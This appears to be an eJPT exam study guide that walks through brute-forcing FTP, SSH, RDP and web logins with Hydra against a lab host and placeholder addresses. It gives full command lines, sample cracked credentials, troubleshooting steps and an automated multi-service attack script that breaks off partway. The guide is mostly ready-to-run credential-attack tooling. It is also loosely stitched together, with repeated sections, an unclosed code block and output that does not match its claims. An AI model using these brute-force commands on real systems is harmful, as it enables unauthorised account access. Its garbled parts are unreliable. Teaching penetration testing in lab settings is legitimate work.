## 🧪 Step-by-Step Lab Walkthrough

### **Lab Scenario: Complete FTP Password Attack From Start to Finish**

**Target:** demo.ine.local (discovered via Nmap)
**Goal:** Find valid FTP credentials and access files
**Time Needed:** 8-12 minutes

---

### **Step 1: Discover FTP Service**

**What We're Doing:** Finding the FTP service on our target

#### **Command Used:**
```bash
nmap -sV demo.ine.local
```

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-08 13:22 IST
Nmap scan report for demo.ine.local (192.121.136.3)
Host is up (0.000021s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5a
MAC Address: 02:42:C0:79:88:03 (unknown)
Service Info: OS: Unix
```

#### **🎯 What This Tells Us:**
- **FTP Service Found** on port 21 (standard FTP port)
- **ProFTPD Version** 1.3.5a (specific software version)
- **Unix System** - tells us what type of passwords to try
- **Service is Active** - ready to accept login attempts

#### **Why This Matters:**
Finding FTP service confirms we have a login target. ProFTPD is common and often has weak default configurations.

---

### **Step 2: Test Basic Authentication**

**What We're Doing:** Trying simple username and password combinations first

#### **Commands Used:**
```bash
# Test common FTP credentials manually
hydra -l admin -p admin demo.ine.local ftp
hydra -l ftp -p ftp demo.ine.local ftp
hydra -l anonymous -p anonymous demo.ine.local ftp
```

#### **What Happened:**
```bash
[21][ftp] host: demo.ine.local   login: admin   password: admin
```

#### **🔍 Result Analysis:**
- **Quick Success** with admin:admin credentials
- **Default Credentials** still enabled on target
- **No Account Lockout** - service accepts multiple attempts
- **Ready for Further Testing** to find more accounts

---

### **Step 3: Full Wordlist Attack**

**What We're Doing:** Using comprehensive wordlists to find all possible credentials

#### **Commands Used:**
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp
```

#### **🔧 Command Explanation:**
- **-L wordlist** - Use list of common usernames
- **-P wordlist** - Use list of common passwords  
- **-t 4** - Use 4 parallel connections for speed
- **demo.ine.local** - Our target system
- **ftp** - The service we're attacking

#### **🎉 Complete Success! What Happened:**
```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 4 tasks per 1 server, overall 4 tasks, 7963 login tries (l:7/p:1138), ~1991 tries per task

```

#### **🔓 What We Discovered:**
- **7 Valid Accounts** found on the FTP server
- **Weak Passwords** like "qwerty", "654321", "butterfly"
- **Different User Types** - admin accounts and regular users
- **No Security Controls** - no account lockout or rate limiting

#### **Credential Summary:**
```bash
sysadmin:654321      # System administrator account
rooty:qwerty         # Root/admin account with weak password
demo:butterfly       # Demo account
auditor:chocolate    # Audit account
anon:purple          # Anonymous-type account

**Your Job:** Find valid credentials across multiple services
**Time Limit:** 10-12 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Test common credentials across all services (3 minutes)
hydra -l admin -p admin target_ip ssh
hydra -l admin -p admin target_ip ftp
hydra -l administrator -p administrator target_ip rdp
hydra -l anonymous -p anonymous target_ip ftp

# Step 2: Systematic wordlist attacks (6-7 minutes)
hydra -L common_users.txt -P common_passwords.txt ssh://target_ip &
hydra -L ftp_users.txt -P ftp_passwords.txt ftp://target_ip &
hydra -L common_users.txt -P common_passwords.txt rdp://target_ip &
wait

# Step 3: Verify discovered credentials (2-3 minutes)
ssh discovered_user@target_ip
ftp target_ip
xfreerdp /u:discovered_user /p:discovered_pass /v:target_ip
# Test each discovered account for functionality
```

#### **Scenario 3: Web Application Authentication Bypass**
**Given:** Web application with login form (192.168.1.200)
**Your Job:** Bypass authentication using Hydra
**Time Limit:** 10-12 minutes

**Step-by-Step Approach:**

# Step 1: Identify web service (2 minutes)
nmap -p 80,443 -sV 192.168.1.200
curl -I http://192.168.1.200
# Check web server type and version

# Step 2: Test HTTP basic auth (3 minutes)
hydra -l admin -P passwords.txt 192.168.1.200 http-get /admin
hydra -l admin -P passwords.txt 192.168.1.200 http-get /manager
# Common protected directories

# Step 3: Form-based attack if needed (5 minutes)
# First, analyze login form
curl http://192.168.1.200/login
# Then configure form attack
hydra 192.168.1.200 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -L users.txt -P passwords.txt

# Step 4: Verify web access (1 minute)
curl -u found_user:found_pass http://192.168.1.200/admin
# Test discovered credentials
```

### **📝 eJPT Exam Tips:**

#### **⏰ Time Management Strategy:**
- **1-2 minutes:** Service discovery and version identification
- **2-3 minutes:** Common credential testing (manual attempts)
- **4-5 minutes:** Comprehensive wordlist attacks
- **1-2 minutes:** Credential verification and access testing
- **Remaining time:** Objective completion and documentation

#### **🎯 Common Mistakes to Avoid:**
1. **Skipping Manual Tests** → Always try common credentials first (admin:admin, etc.)
2. **Wrong Service Syntax** → Remember: ftp, ssh, http-get, http-post-form
3. **Too Many Threads** → Use -t 4 to 16, higher numbers can crash services
4. **Forgetting Verification** → Always test found credentials actually work
5. **Poor Wordlist Choice** → Use appropriate lists (unix_passwords.txt for Linux)

#### **✅ Signs You're Doing Well:**
- **Quick Service Discovery** → FTP/SSH/HTTP identified within 2 minutes
- **Successful Authentication** → Finding valid credentials consistently
- **Proper Verification** → Testing credentials provide real access
- **Time Management** → Completing objectives within time limits
- **Clean Documentation** → Recording all found credentials properly

### **🔍 Typical Exam Questions You'll See:**
1. **"Find valid FTP credentials for the target system"**
   - Use: `hydra -L users.txt -P passwords.txt target_ip ftp`

2. **"What is the password for the admin user on the SSH service?"**
   - Use: `hydra -l admin -P passwords.txt target_ip ssh`

3. **"Access the web admin panel using password attack"**
   - Use: `hydra -l admin -P passwords.txt target_ip http-get /admin`

4. **"What are the valid RDP credentials for the Windows target?"**
   - Use: `hydra -L users.txt -P passwords.txt rdp://target_ip -s 3333`

5. **"How many valid user accounts can you find on the FTP server?"**
   - Use comprehensive wordlist attack and count results

6. **"Can you gain remote desktop access to the target system?"**
   - Use RDP brute force followed by xfreerdp verification

## ⚠️ Common Problems and How to Fix Them

### **❌ Problem 1: RDP Connection Issues**

**What You See:**
```bash
hydra -L users.txt -P passwords.txt rdp://target_ip
# Output: [ERROR] connection refused
# Output: [WARNING] RDP servers often don't like many connections
```

**How to Fix:**
```bash
# Step 1: Reduce parallel connections for RDP
hydra -t 1 -W 5 -L users.txt -P passwords.txt rdp://target_ip
# RDP services are sensitive to multiple connections

# Step 2: Check if service is on non-standard port
nmap -p 3389,3333,3390 target_ip
# Common RDP ports besides default 3389

# Step 3: Use Metasploit to confirm RDP service
msfconsole -q
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target_ip
exploit

# Step 4: Try with explicit port specification
hydra -L users.txt -P passwords.txt rdp://target_ip -s 3333
```

**Common Causes:**
- RDP service configured on non-standard port
- Multiple connection attempts overwhelming service
- Network firewall blocking RDP connections
- Service configured to accept limited concurrent sessions

---

### **❌ Problem 2: No Credentials Found**

**What You See:**
```bash
[DATA] attacking ftp://192.168.1.100:21/
[*] No valid passwords found
[*] Scanned 1 of 1 hosts (100% complete)
```

**How to Fix:**
```bash
# Step 1: Try manual common credentials first
hydra -l admin -p admin target_ip ftp
hydra -l admin -p password target_ip ftp
hydra -l admin -p 123456 target_ip ftp
# Test most common combinations manually

# Step 2: Check if service allows multiple attempts
nmap --script ftp-brute target_ip
# Verify service doesn't have lockout

# Step 3: Try different wordlists
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt target_ip ftp
# Use larger, different wordlists

# Step 4: Verify service is actually accessible
telnet target_ip 21
# Manual connection test
```

**Common Causes:**
- Strong password policy on target
- Account lockout after failed attempts
- Service not actually running or accessible
- Wrong wordlists for target environment

---

### **❌ Problem 3: Performance Issues with Large Wordlists**

**What You See:**
```bash
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344391 login tries
# Very slow progress, taking hours
```

**How to Fix:**
```bash
# Step 1: Use smaller, targeted wordlists first
head -1000 /usr/share/wordlists/rockyou.txt > small_passwords.txt
hydra -L small_users.txt -P small_passwords.txt target_ip service

# Step 2: Optimize thread count for service type
hydra -t 4 target_ip ftp          # Good balance for FTP
hydra -t 1 target_ip rdp          # Conservative for RDP
hydra -t 8 target_ip ssh          # SSH can handle more

# Step 3: Use early exit on success
hydra -f -L users.txt -P passwords.txt target_ip service
# Stop after finding first valid credential

# Step 4: Try most common passwords first
echo -e "password\nadmin\n123456\npassword123" > priority_passwords.txt
hydra -L users.txt -P priority_passwords.txt target_ip service
```

### **❌ Problem 4: xfreerdp Connection Failures After Finding RDP Credentials**

**What You See:**
```bash
[3333][rdp] host: demo.ine.local   login: administrator   password: qwertyuiop
# But xfreerdp fails to connect with discovered credentials
```

**How to Fix:**
```bash
# Step 1: Verify credentials with different RDP client options
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert-ignore
# Ignore certificate errors

# Step 2: Try different security settings
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /sec:rdp
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /sec:tls
# Try different security protocols

# Step 3: Use alternative RDP clients
rdesktop -u administrator -p qwertyuiop demo.ine.local:3333
# Try different RDP client software

# Step 4: Check for domain requirements
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /domain:WORKSTATION
# Try with domain specification
```

## 🔗 Using Hydra with Other Tools (Enhanced)

### **🎯 Complete Attack Chain: Nmap → Metasploit → Hydra → Client Verification**

This shows the comprehensive workflow used in professional penetration testing and eJPT scenarios.

#### **Phase 1: Service Discovery with Nmap**
```bash
# Initial comprehensive scan
nmap -sS -sV -p- target_ip | tee nmap_full_scan.txt

# Extract authentication services
grep -E "(ssh|ftp|rdp|telnet|http|ms-wbt-server)" nmap_full_scan.txt

# Focused scan on discovered services
nmap -p 21,22,80,3389,3333 -sV --script auth-methods target_ip
```

**Integration Benefits:**
- Identifies exact services and versions for targeted attacks
- Reveals non-standard ports that manual guessing would miss
- Provides service-specific information for optimizing attacks

#### **Phase 2: Service Confirmation with Metasploit**
```bash
# RDP service confirmation
msfconsole -q
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target_ip
set RPORT 3333
exploit

# SSH version and capability detection
use auxiliary/scanner/ssh/ssh_version
set RHOSTS target_ip
exploit

# FTP anonymous access testing
use auxiliary/scanner/ftp/anonymous
set RHOSTS target_ip
exploit
```

**Why This Step Matters:**
- Confirms services are actually what nmap detected
- Reveals service-specific vulnerabilities or configurations
- Provides detailed information for customizing attacks

#### **Phase 3: Systematic Credential Testing with Hydra**
```bash
# Based on confirmed services, launch targeted attacks
# RDP attack (confirmed on port 3333)
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://target_ip -s 3333 -o rdp_results.txt

# SSH attack (standard configuration)
hydra -L common_users.txt -P unix_passwords.txt ssh://target_ip -o ssh_results.txt

# FTP attack (if anonymous failed)
hydra -L ftp_users.txt -P ftp_passwords.txt ftp://target_ip -o ftp_results.txt
```

#### **Phase 4: Access Verification and Documentation**
```bash
# RDP access verification
xfreerdp /u:discovered_user /p:discovered_pass /v:target_ip:3333

# SSH access verification
ssh discovered_user@target_ip

# FTP access verification
ftp target_ip
# Test with discovered credentials

# Document system information
whoami                    # Current user context
id                       # User privileges
systeminfo               # System details (Windows)
uname -a                 # System details (Linux)
```

## ⚠️ Common Problems and How to Fix Them

### **❌ Problem 1: No Credentials Found**

**What You See:**
```bash
[DATA] attacking ftp://192.168.1.100:21/
[*] No valid passwords found
[*] Scanned 1 of 1 hosts (100% complete)
```

**How to Fix:**
```bash
# Step 1: Try manual common credentials first
hydra -l admin -p admin target_ip ftp
hydra -l admin -p password target_ip ftp
hydra -l admin -p 123456 target_ip ftp
# Test most common combinations manually

# Step 2: Check if service allows multiple attempts
nmap --script ftp-brute target_ip
# Verify service doesn't have lockout

# Step 3: Try different wordlists
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/rockyou.txt target_ip ftp
# Use larger, different wordlists

# Step 4: Verify service is actually FTP
nmap -sV -p 21 target_ip
# Confirm service type and version
```

**Common Causes:**
- Strong password policy on target
- Account lockout after failed attempts
- Service not actually FTP (HTTP on port 21, etc.)
- Wrong wordlists for target type

---

### **❌ Problem 2: Connection Timeouts**

**What You See:**
```bash
[ERROR] Could not connect to target
[ERROR] Connection timed out
```

**How to Fix:**
```bash
# Step 1: Check basic connectivity
ping target_ip
# Make sure target is reachable

# Step 2: Verify service is running
nmap -p 21,22,80 target_ip
# Confirm services are actually open

# Step 3: Reduce connection attempts
hydra -t 1 -w 5 -l admin -p admin target_ip ftp
# Use fewer threads, more wait time

# Step 4: Check for firewall blocking
nmap -sS target_ip
# Look for filtered ports vs closed ports
```

**Common Causes:**
- Network firewall blocking connections
- Service overloaded by too many attempts
- Target system powered off or unreachable
- Wrong IP address or hostname

---

### **❌ Problem 3: "Password List Exhausted" Too Quickly**

**What You See:**
```bash
[DATA] attacking ftp://target:21/
[*] Password list exhausted
[*] No valid passwords found
```

**How to Fix:**
```bash
# Step 1: Check wordlist files exist and have content
ls -la /usr/share/metasploit-framework/data/wordlists/
head -5 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# Verify wordlists are not empty

# Step 2: Try different wordlist combinations
hydra -l admin -P /usr/share/wordlists/rockyou.txt target_ip ftp
# Use larger password lists

# Step 3: Check case sensitivity
hydra -l Admin -p Password target_ip ftp
hydra -l ADMIN -p PASSWORD target_ip ftp
# Try different case combinations

# Step 4: Manual password generation
echo -e "password\nPassword\nPASSWORD\n123456\nadmin" > custom_pass.txt
hydra -l admin -P custom_pass.txt target_ip ftp
```

**Speed Tips:**
- Start with small, targeted wordlists
- Use common passwords first (password, admin, 123456)
- Try service-specific defaults
- Consider target organization patterns

---

### **❌ Problem 4: Hydra Crashes or Hangs**

**What You See:**
```bash
# Hydra starts but never completes or crashes
Hydra v9.5 starting...
[No further output]
```

**How to Fix:**
```bash
# Step 1: Kill any hanging Hydra processes
ps aux | grep hydra
kill -9 [hydra_process_id]

# Step 2: Restart with minimal settings
hydra -t 1 -l admin -p admin target_ip ftp
# Use minimal threads and simple test

# Step 3: Check system resources
free -h
top
# Make sure system has enough memory/CPU

# Step 4: Try different service or target
hydra -l admin -p admin different_target ftp
# Test if problem is target-specific
```

**Troubleshooting Commands:**
```bash
# Debug mode for detailed output
hydra -d -v -l admin -p admin target_ip ftp

# Alternative tools if Hydra fails
ncrack -p 21 --user admin --pass admin target_ip
medusa -h target_ip -u admin -p admin -M ftp
```

## 🔗 Using Hydra with Other Tools

### **🎯 Complete Attack Chain: Nmap → Hydra → Manual Verification**

This shows how Hydra fits into a complete penetration testing workflow.

#### **Phase 1: Discovery with Nmap**
```bash
# Initial network discovery
nmap -sS -T4 192.168.1.0/24
# Find live hosts in network

# Service enumeration
nmap -sV -p 21,22,23,80,443 192.168.1.0/24
# Identify login services across network

# Detailed service analysis
nmap --script auth-methods target_ip
# Check authentication options for services
```

**What This Gives You:**
- List of targets with login services
- Service versions for targeted attacks
- Authentication methods supported
- Network topology understanding

#### **Phase 2: Targeted Attacks with Hydra**
```bash
# Based on Nmap results, attack each service type
# FTP servers found
hydra -L users.txt -P passwords.txt target1 ftp
hydra -L users.txt -P passwords.txt target2 ftp

# SSH servers found
hydra -L users.txt -P passwords.txt target3 ssh
hydra -L users.txt -P passwords.txt target4 ssh

# Web servers with basic auth
hydra -L users.txt -P passwords.txt target5 http-get /admin
```

**Integration Benefits:**
- **Targeted Approach:** Focus attacks on confirmed services
- **Efficient Testing:** Only attack services that exist
- **Service-Specific Wordlists:** Use appropriate credentials for each service type

#### **Phase 3: Manual Verification and Exploitation**
```bash
# After Hydra finds credentials, verify manually
# FTP access testing
ftp target1
# Username: found_user
# Password: found_pass

# SSH access testing
ssh found_user@target3
# Verify shell access and privileges

# Web access testing
curl -u found_user:found_pass http://target5/admin
# Confirm web panel access
```

### **🔧 Integration with Password Generation Tools:**

#### **Using Crunch to Generate Custom Wordlists:**
```bash
# Generate numeric passwords
crunch 4 6 0123456789 -o numbers.txt
# Create 4-6 digit number combinations

# Use generated list with Hydra
hydra -L users.txt -P numbers.txt target_ip ftp
# Test against numeric password policies

# Generate date-based passwords
crunch 8 8 -t @@@@%%%% -o year_pass.txt
# Format: 4 letters + 4 numbers (like pass2024)

# Use with Hydra
hydra -L users.txt -P year_pass.txt target_ip ssh
```

#### **Using John the Ripper for Password Mutation:**
```bash
# Create password variations
john --wordlist=base_passwords.txt --rules --stdout > mutated_passwords.txt
# Generate common password variations

# Use mutations with Hydra
hydra -L users.txt -P mutated_passwords.txt target_ip ftp
# Test password variations and common substitutions
```

### **⚙️ Multi-Tool Attack Script:**

```bash
#!/bin/bash
# complete_password_attack.sh - Comprehensive password testing

TARGET=$1
LOGFILE="attack_$(date +%Y%m%d_%H%M%S).log"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Starting comprehensive password attack on $TARGET" | tee $LOGFILE

# Phase 1: Service Discovery
echo "[+] Phase 1: Discovering services" | tee -a $LOGFILE
nmap -sV -p 21,22,23,80,443 $TARGET | tee -a $LOGFILE

# Phase 2: FTP Attack
if nmap -p 21 $TARGET | grep -q "open"; then
    echo "[+] Phase 2: FTP password attack" | tee -a $LOGFILE
    hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $TARGET ftp | tee -a $LOGFILE
fi

# Phase 3: SSH Attack
